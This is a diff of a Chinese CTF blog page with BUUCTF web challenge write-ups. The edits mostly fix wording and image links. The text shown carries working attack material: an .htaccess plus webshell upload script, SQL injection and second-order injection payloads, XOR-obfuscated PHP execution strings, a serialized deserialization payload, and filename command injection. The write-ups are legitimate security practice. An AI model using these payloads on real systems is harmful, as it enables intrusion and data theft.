@@ -481,7 +481,7 @@ function get_the_flag()&amp;#123;
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-05-09
+                    2022-05-17
                 </div>
                 
 
@@ -611,6 +611,7 @@ files &#x3D; &#123;&#39;file&#39;:(&#39;shell.sss&#39;,shell,&#39;image&#x2F;jpe
 response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files)
 print(response.text)</code></pre>
 
+<p>这里前半段传的是.htaccess，内容就是把.sss后缀的文件当作php进行解析，而且还对当前目录下的shell.sss进行了base64解码读取。</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119194212595.png" alt="image-20220119194212595"></p>
 <p>得到路径之后蚁剑连一下</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119194354577.png" alt="image-20220119194354577"></p>
@@ -756,8 +757,9 @@ try&#123;
 <h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>进入之后是login.php界面，有login那肯定也有register.php，访问一下然后注册个用户，再登录</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303215431763.png" alt="image-20220303215431763"></p>
 <p>整个页面除了这个用户名其他没有任何有用的地方，于是猜测是二次注入</p>
-<p>information，逗号都被过滤了</p>
-<p>只能用from for代替逗号，之间猜表名是flag</p>
+<p>information，逗号还有其他很多都被过滤了</p>
+<p>只能用from for代替逗号，直接猜表名是flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220517171510356.png" alt="image-20220517171510356"></p>
 <p>确定之后写脚本跑flag</p>
 <pre class="language-python" data-language="python"><code class="language-python">import re
 from time import sleep
@@ -1397,8 +1399,7 @@ end</code></pre>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408103158993.png" alt="image-20220408103158993"></p>
 <p>但是这里并没有什么可以的表，猜测是不是有其他库，重新去看一下库名</p>
 <p>这里用database()只能看到一个aliens库，因为database()只能看到当前库，下次记得一定要把所有库都查出来</p>
-<p>用<code>union+select+1,group_concat(schema_name)+from+information_schema.schemata</code>这个语句可以注出另外两个库,不知道为什么</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104227983.png" alt="image-20220408104227983"></p>
+<p>用<code>union+select+1,group_concat(schema_name)+from+information_schema.schemata</code>这个语句可以注出另外两个库<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104227983.png" alt="image-20220408104227983"></p>
 <p>看一下alien_code库</p>
 <pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema&#x3D;&#39;alien_code&#39;</code></pre>
 
@@ -1736,9 +1737,7 @@ for m in target:
 <p>接下来就是对照着脚本将字符替换掉就行了</p>
 <pre class="language-none"><code class="language-none">((%8f%9c%96%9c%9c%a0%9c)^(%8f%9e%96%9b%9b%a0%9e)^(%8f%8f%96%96%8c%a0%8f)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%9e)^(%8c%9c%9e%96%9b%96%9c)^(%8c%9c%9e%9c%9b%96%8f)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</code></pre>
 
-
-
-<p><img src="/2022/01/19/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/Users/ethe/AppData/Roaming/Typora/typora-user-images/image-20220413151805073.png" alt="image-20220413151805073"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220413151805073.png" alt="image-20220413151805073"></p>
 <p>看到了flag文件，在最后一个，所以用end将指针指向最末尾的文件，然后利用readfile或者show_source读就行了</p>
 <p>payload</p>
 <pre class="language-none"><code class="language-none">((%9e%9a%9e%9b%9e%96%9e%9a)^(%9c%9a%9e%9b%9c%96%96%9a)^(%8f%9a%9e%9b%9b%96%9b%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff))(((%9a%9c%9b)^(%9a%9b%9b)^(%9a%96%9b)^(%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%9e)^(%8c%9c%9e%96%9b%96%9c)^(%8c%9c%9e%9c%9b%96%8f)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</code></pre>
@@ -2058,10 +2057,13 @@ echo serialize($a);</code></pre>
 
 <p>解释：看show里反序列化的部分，是只对attr部分进行了反序列化，所以我们在构造的时候，就要把我们的序列化语句放在attr的位置上，前边四个放1，并且用单引号来闭合前面的第一个单引号，#是为了注释后面的sql语句，保证顺利执行，.png是保证是个图片的后缀，让文件能传上去</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419184421898.png"></p>
-<p>而<code>0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</code>是<code>O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;&#125;</code>的十六进制形式，因为文件名不允许存在双引号，\0是因为我们的序列化的两个属性都是protected类型的，而在储存时对protected序列化后出现的不可见字符与*的组合进行了替换，将chr(0)*chr(0)替换为了\0\0\0，在反序列化时又换了回去，为了程序的执行，所以我们要将其替换</p>
+<p>而</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</code></pre>
+
+<p>是<code>O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;&#125;</code>的十六进制形式，因为文件名不允许存在双引号，\0是因为我们的序列化的两个属性都是protected类型的，而在储存时对protected序列化后出现的不可见字符与*的组合进行了替换，将chr(0)*chr(0)替换为了\0\0\0，在反序列化时又换了回去，为了程序的执行，所以我们要将其替换</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419184018967.png" alt="image-20220419184018967"></p>
 <h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>一道像ssrf的页面，但实际上是xff头的二次注入</p>
-<pre class="language-none"><code class="language-none">我们测试一下，先输入 1’ or ‘1 此时我们的current IP就等于它，让后我们再随便换一个其他的东西，只要和刚才那个不一样就可以，比如111，那么我们的current IP就成了：111，而last IP就是1’ or ‘1，此时1’ or &#39;1已经写入了数据库 .因为第一次和第二次传输的IP不一样，所以服务器并不会从数据库找last IP，它会把上次的IP（1’or ‘1）直接显示为last IP，让后存入数据库。那么我们再传一次111，因为和currnet IP相同，那么last IP就会从数据库里寻找，也就是会执行1’or‘1，结果为一。</code></pre>
+<pre class="language-none"><code class="language-none">我们测试一下，先输入 1’ or ‘1 此时我们的current IP就等于它，然后我们再随便换一个其他的东西，只要和刚才那个不一样就可以，比如111，那么我们的current IP就成了：111，而last IP就是1’ or ‘1，此时1’ or &#39;1已经写入了数据库 .因为第一次和第二次传输的IP不一样，所以服务器并不会从数据库找last IP，它会把上次的IP（1’or ‘1）直接显示为last IP，让后存入数据库。那么我们再传一次111，因为和currnet IP相同，那么last IP就会从数据库里寻找，也就是会执行1’or‘1，结果为一。</code></pre>
 
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420203914643.png" alt="image-20220420203914643"></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420203921117.png" alt="image-20220420203921117"></p>
@@ -2115,7 +2117,7 @@ for i in range(1, 100):
 <p>注册一下登录之后感觉有点像伪协议</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421201110247.png" alt="image-20220421201110247"></p>
 <p>试一下，成功读到了源码</p>
-<pre class="language-php" data-language="php"><code class="language-php">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;user #不知道为什么加上.php就读不到了</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;user</code></pre>
 
 <p>解码</p>
 <p>user.php</p>
@@ -2392,7 +2394,7 @@ include &quot;templates&#x2F;upload.html&quot;;
 <p>访问一下包含的这个文件</p>
 <p>是个文件上传的页面</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421221443724.png" alt="image-20220421221443724"></p>
-<p>但是没法传，但是跳转到了一个新的页面，再用伪协议读一下</p>
+<p>虽然没法传，但是跳转到了一个新的页面，再用伪协议读一下</p>
 <p>upllloadddd.php</p>
 <pre class="language-none"><code class="language-none">&lt;?php
 $allowtype &#x3D; array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);
@@ -2422,7 +2424,7 @@ if(!in_array($ext,$allowtype))&#123;
 ?&gt;</code></pre>
 
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421222040731.png" alt="image-20220421222040731"></p>
-<p>看这句，如果我们再filename出插入命令，就可以执行它</p>
+<p>看这句，如果我们再filename处插入命令，就可以执行它</p>
 <p>那我们就去找真正的文件上传的页面，想到之前的m4aaannngggeee</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421225045605.png" alt="image-20220421225045605"></p>
 <p>利用分号执行多个注释，然后利用井号注释掉后面的语句</p>
@@ -3216,7 +3218,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">149.6k</span>
+                        class="white-color">159.9k</span>
             
             
             
